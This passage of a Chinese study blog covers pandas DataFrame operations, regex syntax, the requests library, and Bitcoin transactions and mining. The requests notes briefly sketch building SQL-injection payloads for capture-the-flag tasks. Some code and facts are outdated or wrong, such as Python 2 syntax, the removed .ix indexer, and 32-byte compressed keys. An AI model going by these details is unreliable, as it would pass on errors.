<h4 id="DataFrame取值赋值-——-变为Series"><a href="#DataFrame取值赋值-——-变为Series" class="headerlink" title="DataFrame取值赋值 —— 变为Series"></a>DataFrame取值赋值 —— 变为Series</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># one       1     5     9</span></div><div class="line"><span class="comment"># two       2     6    10</span></div><div class="line"><span class="comment"># three     3     7    11</span></div><div class="line"><span class="comment"># four      4     8    12</span></div><div class="line"><span class="comment">###############通过列名选取列数据,更改列数据（也可添加）</span></div><div class="line"><span class="keyword">print</span> frame[<span class="string">'num1'</span>]</div><div class="line"><span class="comment"># one      1</span></div><div class="line"><span class="comment"># two      2</span></div><div class="line"><span class="comment"># three    3</span></div><div class="line"><span class="comment"># four     4</span></div><div class="line">frame[<span class="string">'num1'</span>]=np.arange(<span class="number">4</span>)</div><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># one       0     5     9</span></div><div class="line"><span class="comment"># two       1     6    10</span></div><div class="line"><span class="comment"># three     2     7    11</span></div><div class="line"><span class="comment"># four      3     8    12</span></div><div class="line"><span class="comment">#################通过index选择行，通过index位置选择行</span></div><div class="line"><span class="keyword">print</span> frame.loc[<span class="string">'one'</span>]</div><div class="line"><span class="keyword">print</span> frame.iloc[<span class="number">0</span>]</div><div class="line"><span class="comment"># num1    1</span></div><div class="line"><span class="comment"># num2    5</span></div><div class="line"><span class="comment"># num3    9</span></div><div class="line"><span class="comment">###################删除 del drop</span></div><div class="line"><span class="comment">###################axis=1按列 axis=0按行 默认0</span></div><div class="line"><span class="keyword">del</span> frame[<span class="string">'num1'</span>]  <span class="comment">#只能用于列</span></div><div class="line"><span class="comment">#        num2  num3</span></div><div class="line"><span class="comment"># one       5     9</span></div><div class="line"><span class="comment"># two       6    10</span></div><div class="line"><span class="comment"># three     7    11</span></div><div class="line"><span class="comment"># four      8    12</span></div><div class="line"><span class="keyword">print</span> frame.drop([<span class="string">'num1'</span>,<span class="string">'num2'</span>],axis=<span class="number">1</span>)   <span class="comment">#删列，返回一个删除了的新对象</span></div><div class="line"><span class="comment">#        num3</span></div><div class="line"><span class="comment"># one       9</span></div><div class="line"><span class="comment"># two      10</span></div><div class="line"><span class="comment"># three    11</span></div><div class="line"><span class="comment"># four     12</span></div><div class="line"><span class="keyword">print</span> frame.drop([<span class="string">'one'</span>,<span class="string">'two'</span>])         <span class="comment">#删行，返回一个删除了的新对象</span></div><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># three     3     7    11</span></div><div class="line"><span class="comment"># four      4     8    12</span></div></pre></td></tr></table></figure>
<h4 id="选取"><a href="#选取" class="headerlink" title="选取"></a>选取</h4><ol>
<li>行切片 <code>data[1:2]</code> 选取行</li>
<li>布尔型序列 <code>data[[True,False,True,False]]</code> 选取行</li>
<li>布尔型DataFrame过滤 <code>data[data&lt;9]</code> 返回原格式 不满足变为NaN</li>
<li>frame.ix[行索引] （行索引为一个时，结果为Series，多个用序列表示,返回DataFrame）</li>
<li>frame.ix[:,列索引] （行索引为一个时，结果为Series，多个用序列表示,返回DataFrame）</li>
<li>frame.ix[[行索引],[列索引]]<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># one       1     5     9</span></div><div class="line"><span class="comment"># two       2     6    10</span></div><div class="line"><span class="comment"># three     3     7    11</span></div><div class="line"><span class="comment"># four      4     8    12</span></div><div class="line"><span class="keyword">print</span> frame.ix[<span class="string">'one'</span>]</div><div class="line"><span class="comment"># num1    1</span></div><div class="line"><span class="comment"># num2    5</span></div><div class="line"><span class="comment"># num3    9</span></div><div class="line"><span class="comment"># Name: one, dtype: int64</span></div><div class="line"><span class="keyword">print</span> data.ix[[<span class="string">'one'</span>,<span class="string">'two'</span>],[<span class="string">'num1'</span>,<span class="string">'num2'</span>]]</div><div class="line"><span class="comment">#      num1  num2</span></div><div class="line"><span class="comment"># one     1     5</span></div><div class="line"><span class="comment"># two     2     6</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="重新索引"><a href="#重新索引" class="headerlink" title="重新索引"></a>重新索引</h4><p>DataFrame 同理<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">se=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],index=[<span class="string">'one'</span>,<span class="string">'two'</span>,<span class="string">'three'</span>])</div><div class="line"><span class="keyword">print</span> se</div><div class="line"><span class="comment"># one      1</span></div><div class="line"><span class="comment"># two      2</span></div><div class="line"><span class="comment"># three    3</span></div><div class="line">se2=se.reindex([<span class="string">'one'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>],fill_value=<span class="number">0</span>) <span class="comment">#fill_value默认缺失值，默认为NaN</span></div><div class="line"><span class="keyword">print</span> se2</div><div class="line"><span class="comment"># one    1</span></div><div class="line"><span class="comment"># b      0</span></div><div class="line"><span class="comment"># c      0</span></div></pre></td></tr></table></figure></p>
<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p>按照行列索引进行字典排序<br>axis=0 按照行索引   axis=1 按照列索引<br>ascending=True 按照升序  False 按照降序<br>frame.sort_index(axis=0,ascending=True)</p>
<h4 id="文件加载、写入"><a href="#文件加载、写入" class="headerlink" title="文件加载、写入"></a>文件加载、写入</h4><p>将表格性数据读取为DataFrame对象<br>read_csv()<br>从文件、URL、文件型对象中加载带分隔符的数据，默认分隔符为<strong>逗号</strong><br>read_table()<br>从文件、URL、文件型对象中加载带分隔符的数据，默认分隔符为<strong>制表符</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</div><div class="line"><span class="comment">#####文件内容没有自带列索引，分配默认列名</span></div><div class="line">df=pd.read_csv(<span class="string">'文件路径'</span>,header=<span class="keyword">None</span>)</div><div class="line"><span class="comment">#####文件内容没有自带列索引，自己定义列名</span></div><div class="line">df=pd.read_csv(<span class="string">'文件路径'</span>,names=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="comment">#####文件内容没有自带列索引，自己定义列名，指定一列内容作为行索引</span></div><div class="line">df=pd.read_csv(<span class="string">'文件路径'</span>,names=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]，index_col=<span class="string">'d'</span>)</div><div class="line"><span class="comment">##参数sep 指定拆分字符序列 或 正则表达式</span></div><div class="line"><span class="comment">##参数na_values=['NULL'] 指定缺失值 也可用字典指定每列不同值填充为缺失</span></div><div class="line"><span class="comment">##参数encoding=utf8 指定解码形式</span></div><div class="line"><span class="comment">#########文件写入到一个以逗号分隔的文件中</span></div><div class="line">df.to_csv(<span class="string">'文件路径'</span>)</div><div class="line"><span class="comment">##参数na_rep='NULL' 指定输出缺失值</span></div><div class="line"><span class="comment">##参数index=False 指定不写行索引</span></div><div class="line"><span class="comment">##参数header=None 指定不写列索引</span></div><div class="line"><span class="comment">##参数columns=[]  指定要写入的列索引名</span></div><div class="line"><span class="comment">##参数seq='|'     指定分隔符</span></div></pre></td></tr></table></figure></p>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>导入模块<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line">s=<span class="string">'123abc456eabc789'</span></div><div class="line"><span class="keyword">print</span> re.findall(<span class="string">r'abc'</span>,s,re.I)</div></pre></td></tr></table></figure></p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>re.I : 忽略大小写<br>re.M : 多行匹配，影响^和$<br>re.S : 使.匹配包括换行在内的所有字符</p>
<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><p>‘.’ : 匹配除了换行符外的任意一个字符<br>‘^’ : 行首<br>‘$’ : 行末<br>‘\A’: 整个字符串开头<br>‘\Z’: 整个字符串结尾<br>‘\b’: 匹配单词的分割，一个单词的前后都有<br>‘\B’: [^\b]<br>‘|’ : 或，匹配子表达式中的一个，用（）圈定范围,没用（）则表示整个字符串<br>‘?’ : 表示?前一个元素是有可有无的，用（）圈定元素<br>‘+’ : 表示+前一个元素出现一次或多次 &gt;=1 ，用（）圈定元素<br>‘<em>‘ : 表示\</em>前一个元素出现任意多次   &gt;=0 ，用（）圈定元素<br>‘+?’: 表示懒惰模式，满足之后的需求，+所匹配的次数尽可能少<br>‘<em>?’: 表示懒惰模式，满足之后的需求，\</em>所匹配的次数尽可能少<br>‘??’: 表示懒惰模式，满足之后的需求，?尽可能匹配0次<br>‘{min,max}?’： 表示懒惰模式，满足之后的需求，{}匹配的次数尽可能少</p>
<h3 id="字符组"><a href="#字符组" class="headerlink" title="字符组 []"></a>字符组 []</h3><p><strong>字符组</strong>：匹配字符组内的若干字符之一<br>如：[ae] 匹配 a或e<br>字符组中的两种<strong>特殊字符</strong>：<br>‘-‘ : 当’-‘不在字符组开头时，表示范围<br>如：[0-9][a-z][A-z] 等于 [0-9a-zA-Z]<br>‘^’ : 当’^’在字符组开头是，表示排除，匹配除了之后字符以外的字符<br>如：[^1-6] 除了1~6以外的字符<br><strong>预定字符集</strong>（可以不写在[]中）：<br>\d : 数字[0-9]<br>\D ：非数字[^\d]<br>\s : 空白字符[ \t\r\n\f\v]<br>\S : 非空白字符[^\s]<br>\w : 单词字符[A-Za-z0-9_] #有下划线<br>\W : 非单词字符[^\w]<br>\number : 表示跟编号为number的括号（）匹配内容相同的一个字符串 （不是表达式相同）</p>
<h3 id="出现次数范围"><a href="#出现次数范围" class="headerlink" title="出现次数范围"></a>出现次数范围</h3><p>限定{}前面的元素重现次数<br>{num} 固定次数<br>{min,max} 次数范围<br>如 [a-zA-Z]{1,5} 匹配1~5个大小写字母<br>? 等于 {0,1}</p>
<h3 id="（）"><a href="#（）" class="headerlink" title="（）"></a>（）</h3><p>每个括号都有一个编号，从左往右，从1开始<br>1.记忆被匹配到的文本<br>    多个（）一一对应多个变量<br>2.用于|的多选项范围<br>    （）内加 ?: 不记忆这部分被匹配到的内容<br>3.用于? * +的量词作用范围<br>    （）内加 ?: 不记忆这部分被匹配到的内容<br>4.指定别名<br>(?P<name>…) 指定一个别名<br>(?P=name) 引用别名为name的分组匹配到的字符串</name></p>
<p>对于以上<strong>所有</strong>用到的特殊字符，用转义字符’\’来表示本身<br>如 ([a-z]+) ==&gt; (very)</p>
<h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><blockquote>
<p>//requests 包的使用<br>   1.使用requests.get(url=urlforflag)<br>       后者需要手动进行url加密 需要修改变量的地方断开使用字符串链接来构造payload<br>   2.使用response=requests.get(url=url,params=data)<br>       data = {“id”: sql_forflag % (i, x)}<br>       data内的内容会被自动url加密；可以用response.url查看发送的真实url<br>   3.使用response=requests.post(url=url,data=data,cookies=cookies)\<br>       data = {“id”: sql_forflag % (i, x)}<br>       cookies = {dict(PHPSESSID=’c3vg3kihmut0ne06ubhja3hgv6’,hello=’123’)}</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[比特币&区块链与交易]]></title>
      <url>/2017/12/27/%E6%AF%94%E7%89%B9%E5%B8%81&amp;%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8E%E4%BA%A4%E6%98%93/</url>
      <content type="html"><![CDATA[<p>— 交易与脚本 —<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>区块的内容就是交易，下面介绍比特币的具体交易，也就是账单的内容。<br>但是对于其中脚本的部分，也了解甚微。在这里就提个大概。</p>
<h2 id="比特币钱包"><a href="#比特币钱包" class="headerlink" title="比特币钱包"></a>比特币钱包</h2><p>首先需要了解一些专用词</p>
<h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p><strong>比特币地址</strong>：比特币地址是一个由数字和字母组成的字符串，比特币“账户”的唯一标识，如: 1JwSSubhmg6iPtRjtyqhUYYH76Zg3Lfy1T (以1或3开头，长度25字节；base58解码后，为34或35个字符)。有地址对应“密钥”的人，拥有这个地址里的比特币</p>
<p><strong>公钥</strong>：有两种形式：压缩与非压缩；早期使用非压缩（65字节，0x04开头），现在默认压缩（32字节，0x02/0x03开头）。非压缩公钥左右两个32字节有关联，因而可以压缩。<br>一个公钥具有两种形式，所以对应两个比特币地址。这两个比特币地址都可由同一私钥签署交易。</p>
<p><strong>私钥</strong>：巨大的随机整数（256位、32字节），介于:1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141之间的数。</p>
<p><strong>BASE58</strong>：Base58是用于比特币中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址和私钥。相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/“符号。这样做的主要原因是为了肉眼容易识别，在输入的时候不容易打错，</p>
<p><strong>私钥字符串</strong>：因为私钥太长，识别度低，不容易记忆。私钥字符串就是对于原始的随机数进行一定的转换，转换为识别率高的形式。通过BASE58转换成WIF（Wallet import Format)格式的私钥。也可以把私钥转换其他形式，比如以单词的形式(12或者24个单词)，脑钱包的形式,又或者自己记住的某一句话来生成私钥，注意脑钱包生成的私钥随机的安全性并不高。</p>
<ul>
<li>私钥字符串开头的第一位的不同，是用来区分该私钥使用的公钥是否支持压缩格式</li>
<li>老版本未压缩公钥的私钥字符串是33位byte数组，第一位存放私钥的Version信息，当前值为128，生成的Base58都是以5开头。</li>
</ul>
<blockquote>
<p>老版本未压缩私钥=Base58（version+32位随机数）</p>
</blockquote>
<ul>
<li>支持压缩公钥的私钥字符串是34位byte数组，同样是第一位是version信息，它的值也是128，而多出来的一位是最后一个byte是用来存放是否压缩信息的信息，1就表示是支持压缩格式的公钥。经过Base58处理之后正好是L或者K开头</li>
</ul>
<blockquote>
<p>新版本私钥格式=Base58(version+32位随机数+是否支持压缩)</p>
</blockquote>
<p><strong>私钥到公钥</strong>：由私钥经过SECP256K1算法（椭圆曲线算法）处理得到。</p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fmgi1yzm5kj30s40fcgsg.jpg" alt="私钥，公钥，私钥字符串"></p>
<p><strong>公钥到比特币地址</strong>：公钥到地址生成的过程是，先对公钥做一次SHA256(哈希算法)。<br>再经过hash160（一种原始完整性校验消息摘要，160标准对应20字节）处理。<br>在这个20位的byte数组前面再加上一个byte,这个byte就是地址的Version信息，地址的Version当前值为0，Version信息在比特币的test网络上会使用不同的值。<br>再在结尾加上验证信息checksum。在得到的hash160中加入地址的version信息 ，再对该信息做两次SHA-256之后取前4位就是checksum。</p>
<blockquote>
<p>sha-256-hash= SHA-256(public key)<br>hash160=hash160(sha-256-hash)<br>checksum=get_front_four( SHA-256(SHA-256(version+hash160)))<br>address=Base58(version+hash160(SHA-256(public key))+checksum)</p>
</blockquote>
<h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><p>一个数据块中会有多个交易<br>一个完整的交易由以下的元素构成的：</p>
<ul>
<li><strong>版本号</strong> :目前为1（4字节）</li>
<li><strong>输入数量</strong> :正整数（1-9字节） </li>
<li><strong>输入列表</strong> :每块的第一个交易的第一个输入叫做“coinbase”，早期版本中内容被忽略</li>
<li><strong>输出数量</strong> :正整数（1-9字节）</li>
<li><strong>输出列表</strong> :块中的第一个交易的输出是挖矿所得，一般是矿工自己的钱包地址</li>
<li><strong>锁定时间</strong> :如果非0并且序列号小于0xFFFFFFFF，是指块序号；如果交易已经终结，则是指时间戳（4字节）</li>
</ul>
<p><strong>版本</strong>是明确一笔交易参照的规则，除非有重大升级的情况下，版本号基本无变化，是比较固定的一个值。<br><strong>锁定时间</strong>是被该交易加到区块的最早时间，在大多数的情况下他的值都是0，表示需要立即被加入区块中。如果锁定时间大于0而小于5亿，它的值就表示区块高度。如果大于5亿就表示一个Unix时间戳。<br>以下详细说明<strong>输入输出列表</strong>：<br>一个简单的交易输入如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Input:</div><div class="line">Previous tx: f5d8ee39a430901c91a5917b9f2dc19d6d1a0e9cea205b009ca73dd04470b9a6</div><div class="line">Index: 0</div><div class="line">scriptSig: 304502206e21798a42fae0e854281abd38bacd1aeed3ee3738d9e1446618c4571d10</div><div class="line">90db022100e2ac980643b0b82c0e88ffdfec6b64e3e6ba35e7ba5fdd7d5d6cc8d25c6b241501</div></pre></td></tr></table></figure></p>
<p>先说明，每一笔交易的每一个输入都要指定是之前存在的哪一笔交易的哪一个输出（即从何处得到的钱）<br>那么看以上的结构，首先是前一笔交易的哈希值（Previous tx），然后是花费的是第几个输出（Index）也叫索引，通过交易Hash和索引（从0开始），即可唯一确定一个未花费的交易输出——UTXO（Unspent Transaction Output）。这样，每一个Tx Input都和之前的某个Tx Output关联了起来。<br>最后是解锁脚本（scriptSig），解锁脚本存在的意义在于验证成立这笔交易的人有权利使用他指定的UTXO。其中解锁脚本=签名+公钥，公钥是该比特币花费者的公钥，签名是对当前这笔交易的更改信息作为message的以私钥进行的签名</p>
<p>一个简单的交易输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Output:</div><div class="line">Value: 5000000000</div><div class="line">scriptPubKey: OP_DUP OP_HASH160 404371705fa9bd789a2fcd52d2c580b65d35549d</div><div class="line">OP_EQUALVERIFY OP_CHECKSIG</div></pre></td></tr></table></figure></p>
<p>首先是输出金额（Value），然后是锁定脚本，锁定脚本包括脚本系统中的一系列操作符。</p>
<h3 id="交易类型"><a href="#交易类型" class="headerlink" title="交易类型"></a>交易类型</h3><p>比特币目前提供了两种不同的交易类型，如下所示。通过这两者类型的交易可以组合出更加复杂的交易，称之为合约。<br>（1）Pay-to-PubkeyHash<br>这个也是最常见的交易，目标地址就是比特币地址，花费时需要提供签名和公钥。<br>（2）Pay-to-Script-Hash（P2SH）<br>在P2SH中，目标地址由脚本哈希取代，解锁脚本中才包含签名和脚本内容。可以设定为类似解锁脚本中只需要5个公钥中任意两个私钥的签名即可。</p>
]]></content>
      
        
        <tags>
            
            <tag> 区块链 </tag>
            
            <tag> 比特币 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[比特币&区块链与挖矿]]></title>
      <url>/2017/12/27/%E6%AF%94%E7%89%B9%E5%B8%81&amp;%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8E%E6%8C%96%E7%9F%BF/</url>
      <content type="html"><![CDATA[<p>— 矿工的世界 —<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近这段时间好好学习了下比特币，但也只是初步了解了个大概，也有好多疑问没有解决。<br>根据各个地方收集到的资料，加上自己的理解，写下了这篇博客。</p>
<h2 id="比特币定义"><a href="#比特币定义" class="headerlink" title="比特币定义"></a>比特币定义</h2><p><strong>比特币</strong>是一种由开源的P2P软件产生的数字货币，是通过计算产生的，由一串串复杂的计算机代码组成。与传统的法定货币不同的是，比特币不依赖于特定的中央发行机构，而是使用遍布整个P2P网络节点的分布式数据库来记录货币的交易，并使用密码学的加密设计来确保货币流通各个环节的安全性。</p>
<h3 id="比特币总量"><a href="#比特币总量" class="headerlink" title="比特币总量"></a>比特币总量</h3><p>比特币的发行上限为2100万枚</p>
<h3 id="比特币的产生速度"><a href="#比特币的产生速度" class="headerlink" title="比特币的产生速度"></a>比特币的产生速度</h3><p>大约每10分钟可以产生出25枚比特币，产量每四年会缩减一半（2009-2012年的最初4年内，每10分钟产出50枚比特币）,因此比特币的流通数目将在2140年达到它的发行上限。</p>
<h2 id="分布式数据库"><a href="#分布式数据库" class="headerlink" title="分布式数据库"></a>分布式数据库</h2><p>分布式数据库系统通常使用较小的计算机系统，每台计算机可单独放在一个地方，每台计算机中都可能有DBMS的一份完整拷贝副本，或者部分拷贝副本，并具有自己局部的数据库，位于不同地点的许多计算机通过网络互相连接，共同组成一个完整的、全局的逻辑上集中、物理上分布的大型数据库。</p>
<ul>
<li>无发行机构（政府、个人、企业等）</li>
<li>任何人都可以挖掘、购买、出售、收取比特币</li>
<li>交易过程中外人无法识别用户身份信息</li>
<li>支付速度快1秒内完成交易，10分钟内全网节点记录、验证、确认，实现交易确认</li>
<li>点对点兑换和交易，成本为零。通过比特币交易所来兑换，支付千分之三或更少手续费</li>
</ul>
<h3 id="比特币系统中的数据库——区块和区块链"><a href="#比特币系统中的数据库——区块和区块链" class="headerlink" title="比特币系统中的数据库——区块和区块链"></a>比特币系统中的数据库——区块和区块链</h3><p>区块链是比特币的底层技术，但已经独立地发展为了一种革命性技术。比特币则是区块链最大最成功的的应用。<br>区块链是一个基于共识机制、防篡改、去中心化的公开数据库。</p>
<ul>
<li><em>共识机制</em>使之在分布式系统中保证数据一致性的算法;</li>
<li><em>防篡改特性</em>是基于哈希算法实现的</li>
<li><em>去中心化</em>是指参与区块链的所有节点都是权利对等的，没有高低之分，唯一的限制就是个人自己的选择。</li>
<li><em>公开数据库</em>则意味着所有人都可以看到过往的区块和交易，这也保证了无法造价和改写。</li>
</ul>
<p><strong>Block Chain(区块链)</strong>：比特币从开始到现在的每一笔产出或交易的记录文件。<a href="https://link.zhihu.com/?target=http%3A//blockchain.info/" target="_blank" rel="external">Bitcoin Block Explorer</a>可以查看<br><strong>Block(数据区块)</strong>：一个区块是部分或所有最新(未被其他先前的区块记录)比特币交易的记录集。大约10min产生一个。</p>
<p>以下给出比特币系统中的区块结构，在之后会有说明<br>数据区块结构：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fmgi0r6p5hj30n707nt99.jpg" alt="数据区块结构"><br>区块头结构：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fmgi07kgwoj30n40b6t9u.jpg" alt="区块头结构"></p>
<h2 id="矿工的世界"><a href="#矿工的世界" class="headerlink" title="矿工的世界"></a>矿工的世界</h2><p>在p2p比特币网络中，一些节点被称为<em>专业节点矿工</em>。<br>矿工的工作：</p>
<ul>
<li>接受、验证、中继新交易</li>
<li>挖矿——开发新的区块</li>
<li>监听、验证、传播新区块</li>
</ul>
<p>矿工们在挖矿过程中会得到两种类型的奖励：</p>
<ul>
<li>创建新区块的新币奖励</li>
<li>区块中所含交易的交易费</li>
</ul>
<p>矿工的各种工作大都是<strong>同时</strong>进行的，挖矿的同时在处理交易，并一直监听是否有新的区块产生。<br>1.矿工在网络中收集被广播的比特币交易，把验证过的交易，加到自己的交易池中。根据块龄，矿工费和优先级排序交易，靠前的交易优先被记录。<br>2.当监听到新区块产生，就立刻停下工作，先去验证新的区块。验证通过，会尝试将新的区块连接到现存的区块链，将他们组装起来，并继续传播此区块，同时要将新区块中对应的交易从交易池中移除，确保任何留在内存池中的交易都是未确认的。<br>3.当自己挖到一个新区块，就立刻将新区块发送给相邻节点。<br><em>新区块象征着本轮区块竞争的结束，也是下一轮竞争的开始。</em></p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fmvfzl1rqsj30ap0g9gmt.jpg" alt="矿工的工作"></p>
<h3 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h3><p>通过开源的计算方法在比特币特定的数据链上运算正确的比特币数据区块的行为，产生比特币的唯一途径。<br>挖矿三个重要功能：</p>
<ol>
<li>维系货币的支付功能(对于比特币系统的最主要功能)</li>
<li><p>通过算力保障系统安全（防止“双重支付”）</p>
<blockquote>
<p>双重支付:2次或多次花费同一笔比特币</p>
</blockquote>
</li>
<li><p>发行新的货币(总量达到之前)</p>
</li>
</ol>
<h3 id="挖矿算法"><a href="#挖矿算法" class="headerlink" title="挖矿算法"></a>挖矿算法</h3><p>区块头参数：</p>
<ul>
<li><strong>version</strong>：版本号</li>
<li><strong>prev_hash</strong>: 上一个Block(父区块)的hash值</li>
<li><strong>merkle_root</strong>：这个区块中全部交易构成的<a href="http://blog.csdn.net/wo541075754/article/details/54632929" target="_blank" rel="external">merkle树的根</a> (为了防止有交易出现在倒数第二层，如果当前交易数量是奇数的话，那么最后一个交易将会被计算两次哈希值)</li>
<li><strong>ntime</strong>：区块生成的时刻（以Unix纪元开始到当下的秒数，精确到秒）（每几秒更新） </li>
<li><strong>nbits</strong>: 当前运算难度，最终反应结果为TARGET的</li>
<li><strong>X</strong>：正确运算结果的唯一参数，范围是0~2^32</li>
<li><strong>TARGET</strong>: 比特币系统要求新的哈希值拥有特定的格式——必须以一串特定数量的0开头</li>
</ul>
<p><strong>挖矿算法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SHA256(SHA256(version + prev_hash + merkle_root + ntime + nbits + x)) &lt; TARGET</div></pre></td></tr></table></figure></p>
<p>对区块头进行哈希运算，将所得哈希值与目标哈希值进行比较，如果当前X值计算的哈希值小于目标哈希值，则挖矿成功。如果这个哈希值不小于目标值，矿工就会修改这个X（通常将之加1）然后再试。</p>
<h4 id="Q1-如何保证区块更新周期平均是10min？"><a href="#Q1-如何保证区块更新周期平均是10min？" class="headerlink" title="Q1. 如何保证区块更新周期平均是10min？"></a>Q1. 如何保证区块更新周期平均是10min？</h4><p>nbits越大，TARGET越小，解出X的难度越大。<code>target=2**（256-nbits）</code><br>难度值nbits是节点自动调整的。<br><code>New nbits= Old nbits*（Actual time of last 2016 Blocks/ 20160 minutes）</code><br>（即最新2016个区块花费时长与20160分钟（2周）比较所得，期望10min产生一个）</p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fmvgw88o5cj30mw0aywed.jpg" alt="区块的链接"></p>
<h3 id="区块成熟时间-Maturation-Time"><a href="#区块成熟时间-Maturation-Time" class="headerlink" title="区块成熟时间(Maturation Time)"></a>区块成熟时间(Maturation Time)</h3><p><strong>区块成熟时间</strong>是指矿工产生一个新区块得到25BTC收益后，要等过了100个块后，才能使用这些币。这个100区块时间，即收到100个确认的时间，就是区块成熟时间。<br><em>为什么要设这个时间？</em><br>如果这个区块在分叉时变成了孤立区块，25个BTC的收益将消失，如果矿工挖到比特币后可以马上花掉，就会造成后续的一系列接收者损失比特币，因而设定了100个确认的限制，在这之后产生分叉的可能性非常小，即使产生分叉，也只会影响矿工收益，不会影响到其他人。</p>
<h4 id="Q2-是否有可能同时解出区块-？"><a href="#Q2-是否有可能同时解出区块-？" class="headerlink" title="Q2. 是否有可能同时解出区块 ？"></a>Q2. 是否有可能同时解出区块 ？</h4><p> 当两个区块产生的时间仅相差几秒时，可能会产生包含一个区块的分叉。</p>
<h4 id="Q3-同时解出来怎么办-？"><a href="#Q3-同时解出来怎么办-？" class="headerlink" title="Q3. 同时解出来怎么办 ？"></a>Q3. 同时解出来怎么办 ？</h4><p>短暂产生两个分支，矿工节点会根据收到区块的时间，在先收到的区块基础上继续挖矿。哪个区块的后续区块先出现，这个区块就被包括进主链，因为这条块链更长，所有人都会选择这个更长的分支。没选中的区块的矿工，所得比特币无效，其区块中包含的交易也无效(虽然这种交易的无效是暂时的，这些交易会被重新广播投入到交易池中被新的区块重新记录，但是此处引起双重支付的可能)。</p>
